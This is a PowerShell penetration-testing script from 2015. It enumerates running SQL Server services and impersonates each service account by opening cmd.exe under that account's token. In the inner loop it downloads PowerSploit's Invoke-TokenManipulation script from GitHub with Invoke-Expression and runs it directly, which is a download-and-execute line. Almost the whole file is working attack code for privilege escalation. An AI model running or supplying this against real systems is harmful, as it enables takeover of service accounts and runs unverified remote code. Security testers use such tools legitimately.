# script: Invoke-SqlServerServiceImpersonation-Cmd.ps1
# author: scott sutherland (@_nullbind), 2015 netspi
# Description: This script enumerates running sql server processes and 
# opens a cmd.exe console as each of the service account.  This can be
# used as to gain access to the sql server if the sa password is lost or locked.
#...also if a fun demo during pentests.
# credits: JosephBialek for invoke-mikatz.ps1 and benjamin delpy for the original mimikatz.

Write-Host "Getting list of SQL Server services..."
$SqlServices = Get-WmiObject -Class win32_service | where {$_.pathname -like "*Microsoft SQL Server*"} | select displayname,pathname,StartName 
$RunningProc = Get-WmiObject -Class win32_process | select processid,ExecutablePath

Write-Host "Getting list of SQL Server processes..."
$RunningProc | 
ForEach-Object {
  
    $p_ExecutablePath = $_.ExecutablePath
    $p_processid = $_.processid
    $SqlServices | 
    ForEach-Object {
        $s_pathname = $_.pathname.Split("`"")[1]
        $s_displayname = $_.displayname
        $s_serviceaccount = $_.StartName        
        if($s_pathname -like "$p_ExecutablePath"){
            Write-Host "Creating console for service: $s_displayname - Account: $s_serviceaccount"
            Invoke-Expression (new-object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-TokenManipulation.ps1');
            Invoke-TokenManipulation -CreateProcess 'cmd.exe' -ProcessId $p_processid -ErrorAction SilentlyContinue
        }
    }    
}

Write-Host "Done."
